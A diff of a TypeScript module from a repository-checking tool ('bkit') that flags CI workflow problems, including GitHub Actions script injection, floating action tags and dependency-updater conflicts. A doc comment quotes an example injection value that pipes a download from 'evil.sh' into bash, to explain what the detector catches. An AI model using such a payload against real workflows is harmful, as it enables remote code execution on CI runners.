@@ -3,7 +3,6 @@ import * as fs from "node:fs";
 import * as path from "node:path";
 import { execSync, execFileSync, spawnSync } from "node:child_process";
 import { detectMissingDotenv, detectBlankDotenvKeys, detectDirenvMissing, detectDirenvNotAllowed, dedupeById, } from "./bkit-preflight.js";
-import { readBkitIgnoreFile, isFileIgnored } from "./bkit-bkitignore.js";
 import { parseIssueTracker, DEFAULT_ISSUE_TRACKER, parseCloudAgents, DEFAULT_CLOUD_AGENTS, } from "./bkit-manifest.js";
 import { readBkitVersion, MANAGED_MARKER_LINE_RE, MANAGED_MARKER_VERSION_RE, } from "./bkit-version.js";
 import { getPkgRoot, getTemplatesRoot } from "./bkit-paths.js";
@@ -332,8 +331,8 @@ export function detectCiYmlMissingTokenEnv(cwd) {
  * the run job executes on every triggering event (unintended runner-minute spend).
  *
  * Fires only while the broken construct is present; the fixed form is a `>-` folded
- * expression with no ${{ }} wrapper. bkit-cloud.yml is not always rewritten on a
- * re-install of older consumers, so the action inlines the manual fix.
+ * expression with no ${{ }} wrapper. bkit-cloud.yml is the consumer's copy of a
+ * template and bkit never rewrites it, so the action inlines the manual fix.
  */
 export function detectBkitCloudYmlAlwaysTrueGate(cwd) {
     const cloudPath = path.join(cwd, ".github", "workflows", "bkit-cloud.yml");
@@ -363,9 +362,9 @@ export function detectBkitCloudYmlAlwaysTrueGate(cwd) {
  * but invalid GitHub Actions (doubled quotes inside ${{ }}, always-true `if:` block
  * scalars). actionlint is GHA-aware and catches that class.
  *
- * Only fires when the consumer opted into a bkit-managed ci.yml (markers present).
- * ci.yml is Tier-3 seed-or-print, so `bkit install` will not add the step to an
- * existing file — the action inlines the manual step.
+ * Only fires when the consumer adopted bkit's ci.yml template (markers present).
+ * ci.yml is the consumer's file, so `bkit install` never adds the step — the action
+ * inlines the manual step.
  */
 export function detectCiYmlMissingActionlint(cwd) {
     const ciPath = path.join(cwd, ".github", "workflows", "ci.yml");
@@ -395,9 +394,9 @@ export function detectCiYmlMissingActionlint(cwd) {
  * `"; curl evil.sh | bash; "` expands into the runner's shell when `${{ github.event.* }}`
  * (or `github.head_ref`) is inlined into `run:` text. The safe form is env-indirection: map
  * the value to an `env:` var and reference `$VAR` (GitHub runtime-expands env values and never
- * re-parses them as shell). ci.yml is Tier-3 seed-or-print — bkit's template was hardened but
- * never back-fills an existing consumer, so a repo seeded before the fix keeps the vulnerable
- * inline form with only a generic drift nudge. This surfaces it as a dedicated security finding.
+ * re-parses them as shell). ci.yml is the consumer's file — bkit's template was hardened but
+ * nothing back-fills a copy adopted before the fix, so it keeps the vulnerable inline form.
+ * This surfaces it as a dedicated security finding.
  *
  * Line-based (no YAML dep, like the sibling ci.yml detectors): tracks `run:` blocks by
  * indentation and flags untrusted expressions inside their bodies only. `env:` / `if:` /
@@ -477,7 +476,7 @@ export function detectCiYmlRunInjection(cwd) {
 }
 /**
  * Detect drift of the consumer's `bkit-tests-check` capstone from bkit's canonical
- * CI contract. ci.yml is Tier-3 seed-or-print (consumer-owned, freely edited) — bkit
+ * CI contract. ci.yml is the consumer's copy of a template (freely edited) — bkit
  * never rewrites it, so over time a copy can silently lose a load-bearing invariant and
  * reintroduce a bug bkit already fixed (e.g. the concurrency-cancel that killed a
  * push-only @live canary). WARNING-ONLY presence check: flags the ABSENCE of a known-good
@@ -1017,8 +1016,8 @@ export function detectBkitStubs(cwd) {
         const legacyJobs = ["bkit-decide", "bkit-tests-migrate"].filter(hasLegacyJob);
         if (legacyJobs.length > 0) {
             // docs/testing.md is bkit-managed and refreshes on every upgrade, so it already names
-            // the CURRENT jobs (bkit-tests-scope / bkit-tests-migration) while this Tier-3 ci.yml —
-            // which upgrade never rewrites — still names the legacy ones. Make that docs-vs-CI skew
+            // the CURRENT jobs (bkit-tests-scope / bkit-tests-migration) while this ci.yml —
+            // the consumer's file, which upgrade never rewrites — still names the legacy ones. Make that docs-vs-CI skew
             // explicit when the managed docs are present and already migrated, so the mismatch is a
             // stated finding rather than something an agent has to spot for itself. readOnce reuses
             // the cache + baseline read-guard (no new error-obscuring catch).
@@ -1199,21 +1198,16 @@ export function detectTestIntegrationEnv(cwd) {
  * references (`uses: <owner>/<repo>@v\d+`) without SHA pinning. KN-3 mandates
  * SHA pins for any workflow that runs with elevated permissions.
  *
- * bkit-canonical workflow files (those tracked in `.bkit/version`
- * under `canonicalHashes` or `tier3Hashes`) are exempt — bkit owns their pins
- * and `bkit install` rewrites them, so a consumer edit would be overwritten.
- * The example updater configs ignore `.github/workflows/bkit-cloud.yml` for
- * the same reason.
+ * bkit-owned workflow files (those tracked in `.bkit/version` `canonicalHashes`)
+ * are exempt — bkit owns their pins and `bkit install` rewrites them, so a
+ * consumer edit would be overwritten.
  */
 export function detectGhaFloatingTags(cwd) {
     const workflowsDir = path.join(cwd, ".github", "workflows");
     if (!fs.existsSync(workflowsDir) || !fs.statSync(workflowsDir).isDirectory())
         return null;
     const bkitVersion = readBkitVersion(path.join(cwd, ".bkit", "version"));
-    const canonicalPaths = new Set([
-        ...Object.keys(bkitVersion?.canonicalHashes ?? {}),
-        ...Object.keys(bkitVersion?.tier3Hashes ?? {}),
-    ]);
+    const canonicalPaths = new Set(Object.keys(bkitVersion?.canonicalHashes ?? {}));
     const floatingByFile = new Map();
     for (const entry of fs.readdirSync(workflowsDir, { withFileTypes: true })) {
         if (!entry.isFile())
@@ -1269,8 +1263,8 @@ export function detectRunLevelsNotComposed(cwd) {
     // `cache.outputs.skip` — neither is consumer composition. So we look for the READ form,
     // on uncommented lines only (the shipped `bkit-stub:e2e` block reads the outputs but is
     // commented out by default — enabling it correctly counts as composition).
-    // ci.yml is Tier-3 (seed-or-print, no bkit:start/end markers), so we can no longer fence
-    // off "bkit's region"; matching the read form is what distinguishes a consumer gate.
+    // ci.yml is the consumer's file (no bkit:start/end region to fence off), so matching the
+    // read form is what distinguishes a consumer gate.
     const readTokens = [
         "steps.detect.outputs.should_force_build",
         "steps.detect.outputs.should_run_full",
@@ -1569,7 +1563,6 @@ const UPDATER_EXAMPLE_PATHS = [
     ".bkit/templates/.github/workflows/renovate.yml",
     ".bkit/templates/.github/dependabot.yml",
 ].join("\n  ");
-const BKIT_OWNED_WORKFLOW = ".github/workflows/bkit-cloud.yml";
 function updaterConfigPaths(cwd) {
     const renovateJson5 = path.join(cwd, ".github", "renovate.json5");
     const renovateJson = path.join(cwd, ".github", "renovate.json");
@@ -1601,21 +1594,15 @@ function legacyDepUpdaterOptOut(cwd) {
         return false;
     }
 }
-function configOmitsBkitWorkflow(configPath) {
-    return !fs.readFileSync(configPath, "utf-8").includes("bkit-cloud.yml");
-}
 /**
  * Read-only dependency-updater check.
  *
  * - Both Renovate and Dependabot configs → they open competing PRs.
- * - An updater config exists, `bkit-cloud.yml` exists, and the config does not
- *   name that file → the updater will re-pin a file `bkit install` rewrites.
  * - No updater config, workflows exist, and the legacy opt-out is unset → point
  *   at the example templates.
  */
 export function buildDepUpdaterSetupAdvisory(cwd) {
     const { renovate, dependabot } = updaterConfigPaths(cwd);
-    const cloudOwned = fs.existsSync(path.join(cwd, ".github", "workflows", "bkit-cloud.yml"));
     if (renovate && dependabot) {
         return {
             id: "dep-updater-both",
@@ -1624,20 +1611,7 @@ export function buildDepUpdaterSetupAdvisory(cwd) {
             action: "Keep one. Delete the config you are not using, and turn off that bot in the host UI.",
         };
     }
-    const active = renovate ?? dependabot;
-    if (active && cloudOwned && configOmitsBkitWorkflow(active)) {
-        const rel = path.relative(cwd, active);
-        const fence = renovate
-            ? `Add ".github/workflows/bkit-cloud.yml" to \`ignorePaths\` in ${rel} (\`enabled: false\` does not stop Renovate's tag-to-SHA pin).`
-            : `Add ".github/workflows/bkit-cloud.yml" under \`exclude-paths\` on the github-actions block in ${rel}.`;
-        return {
-            id: "dep-updater-touches-bkit",
-            severity: "advisory",
-            detect: `${rel} does not exclude ${BKIT_OWNED_WORKFLOW}. bkit rewrites that workflow on install, so an updater pin PR for it reopens forever.`,
-            action: fence + " The example templates already exclude it. See .bkit/templates.md.",
-        };
-    }
-    if (active)
+    if (renovate || dependabot)
         return null;
     if (legacyDepUpdaterOptOut(cwd))
         return null;
@@ -2585,8 +2559,8 @@ export function runPostInstallCheck(preflightAdvisories, ws, modules, cwd = proc
     const ciActionlint = detectCiYmlMissingActionlint(cwd);
     if (ciActionlint)
         phase3.push(ciActionlint);
-    // ci.yml untrusted input inlined into a run: body (GHA script-injection sink). Tier-3
-    // seed-or-print never back-fills the template's env-indirection fix onto older consumers.
+    // ci.yml untrusted input inlined into a run: body (GHA script-injection sink). Nothing
+    // back-fills the template's env-indirection fix onto a copy adopted before it.
     const ciRunInjection = detectCiYmlRunInjection(cwd);
     if (ciRunInjection)
         phase3.push(ciRunInjection);
@@ -2650,45 +2624,11 @@ export function runPostInstallCheck(preflightAdvisories, ws, modules, cwd = proc
     const deduped = dedupeById(phase3);
     // Dedupe the incoming preflightAdvisories (ctx.advisories may contain module-emitted
     // duplicates in addition to runPreflight's already-deduped output).
-    // Apply .bkitignore filter: suppress Tier-3 drift findings for ignored files.
-    const dedupedPreflight = dedupeById(filterBkitIgnored(preflightAdvisories, cwd));
+    const dedupedPreflight = dedupeById(preflightAdvisories);
     // Cross-phase dedup: Phase 3 wins on conflict (remove preflight entries whose id
     // appears in Phase 3, then merge Phase 3 at the front for the winning position).
     const phase3Ids = new Set(deduped.map((f) => f.id));
     const filteredPreflight = dedupedPreflight.filter((f) => !phase3Ids.has(f.id));
     // Final order: preflight advisories (that weren't superseded) first, then Phase 3
     return [...filteredPreflight, ...deduped];
-}
-// ---------------------------------------------------------------------------
-// .bkitignore filter helper
-// ---------------------------------------------------------------------------
-/**
- * Extract the file path from a Tier-3 drift finding's detect string.
- * Tier-3 findings have detect: `${dstPath} exists and differs from the bkit reference.`
- * Returns the path portion (before " exists and differs") or null if not a Tier-3 finding.
- */
-function extractTier3FilePath(finding) {
-    if (!finding.id.startsWith("tier3-merge-suggested-"))
-        return null;
-    const suffix = " exists and differs from the bkit reference.";
-    if (finding.detect.endsWith(suffix)) {
-        return finding.detect.slice(0, finding.detect.length - suffix.length);
-    }
-    return null;
-}
-/**
- * Filter findings array to remove Tier-3 drift findings whose file path is
- * matched by the consumer's .bkitignore. Non-Tier-3 findings pass through.
- * Graceful no-op if .bkitignore is absent (readBkitIgnoreFile returns []).
- */
-export function filterBkitIgnored(findings, cwd) {
-    const rules = readBkitIgnoreFile(cwd);
-    if (rules.length === 0)
-        return findings;
-    return findings.filter((f) => {
-        const filePath = extractTier3FilePath(f);
-        if (filePath === null)
-            return true; // not a Tier-3 finding — always keep
-        return !isFileIgnored(filePath, rules);
-    });
 }
